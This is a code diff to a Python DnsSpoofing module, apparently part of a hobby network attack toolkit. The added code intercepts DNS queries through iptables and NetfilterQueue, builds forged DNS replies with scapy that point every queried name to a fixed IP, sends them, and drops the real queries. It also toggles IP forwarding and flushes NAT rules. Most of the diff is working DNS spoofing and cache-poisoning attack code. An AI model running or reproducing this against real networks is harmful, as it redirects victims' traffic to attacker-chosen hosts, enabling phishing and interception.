@@ -19,7 +19,7 @@ class DnsSpoofing(CommandModule) :
 
     def run(self) :
         if False == NetSetup.getInstance().checkIpForward() :
-            NetSetup.getInstance().ipForward()
+            NetSetup.getInstance().ipForward(1)
 
 
         # This rule of iptables can make a packet which is modifiable.
@@ -38,38 +38,75 @@ class DnsSpoofing(CommandModule) :
 
         # DNS-Spoofing
         # _thread.start_new_thread(self.dnsCachePoisoning, (queryID, responseID))
-        self.dnsCachePoisoning(queryID, responseID)
+        self.dnsCachePoisoning(responseID, queryID)
 
 
-    def dnsCachePoisoning(self, queryID, responseID) :
+    def dnsCachePoisoning(self, responseID, queryID) :
         print("# DNS cache poisoning...")
         # sniff(lfilter=lambda x: x.haslayer(DNS), prn=processDns)
         try :
             self.getNFQueue(queryID).bind(queryID, self.dnsQueryCallback)
-            self.getNFQueue(responseID).bind(responseID, self.dnsResponseCallback)
+            # self.getNFQueue(responseID).bind(responseID, self.dnsResponseCallback)
+
             self.getNFQueue(queryID).run()
-            self.getNFQueue(responseID).run()
+            # self.getNFQueue(responseID).run()
+
         except KeyboardInterrupt :
             self.getNFQueue(queryID).unbind()
-            self.getNFQueue(responseID).unbind()
-	
+            # self.getNFQueue(responseID).unbind()
+
+            NetSetup.getInstance().ipForward(0)
+            iptablesOpt = "-t nat -F"
+            NetSetup.getInstance().ipTables(iptablesOpt)
+
 
     def dnsQueryCallback(self, packet) :
-        # pkt = IP(packet.get_payload)
-        # packet.set_payload(str(pkt))
         print("# DNS Query")
-        print(packet)
-        packet.accept()
-        pass
+        resq = self.makeDnsResponse(packet)
+        send(resq)
+        packet.drop()
 
 
+    """
     def dnsResponseCallback(self, packet) :
-        # pkt = IP(packet.get_payload)
-        # packet.set_payload(str(pkt))
         print("# DNS Response")
-        print(packet)
+        payload = IP(packet.get_payload())
+        payload[DNS].an = DNSRR(rrname="naver.com", rdata="125.209.222.141")
+        packet.set_payload(str(payload))
         packet.accept()
-        pass
+    """
+
+
+    def makeDnsResponse(self, packet) :
+        pkt = IP(packet.get_payload())
+        fakeIp = "125.209.222.141"	# naver.com
+
+        # resp = IP(dst=ip.src, src=ip.dst)\
+        #     /UDP(dport=ip.sport, sport=dport)\
+        #     /DNS(id=dns.id, qr=1, qd=dns.qd, an=DNSRR(rrname=dns.qd.qname, ttl=10, rdata=fakeIp))
+        # pkt.show()
+        ip = IP()
+        ip.src = pkt[IP].dst
+        ip.dst = pkt[IP].src
+
+        udp = UDP()
+        udp.sport = pkt[UDP].dport
+        udp.dport = pkt[UDP].sport
+
+        dns = DNS()
+        dns.id = pkt[DNS].id
+        dns.opcode = 1
+        dns.qdcount = 1		# question count.
+        dns.ancount = 1		# answer count.
+        dns.nscount = 0		# authority count.
+        dns.arcount = 0		# additional count.
+        dns.qd = pkt[DNS].qd
+        dns.an = DNSRR(rrname=pkt[DNS].qd.qname, type=1, rclass=0x0001, ttl=25740, rdlen=4, rdata=fakeIp)
+
+        print("Sending the fake DNS reply to %s:%s" % (ip.dst, udp.dport))
+        resp = ip/udp/dns
+        # resp.show()
+        return resp
 
 
 """
@@ -82,7 +119,6 @@ def processDns(packet) :
     # DNSRR : DNS Resource Record
     elif DNSRR in packet and packet.sport == 53 :
         print("# response...")
-        # payload = IP(packet.get_payload())
     else :
         print("It is not a DNS packet")
         pass
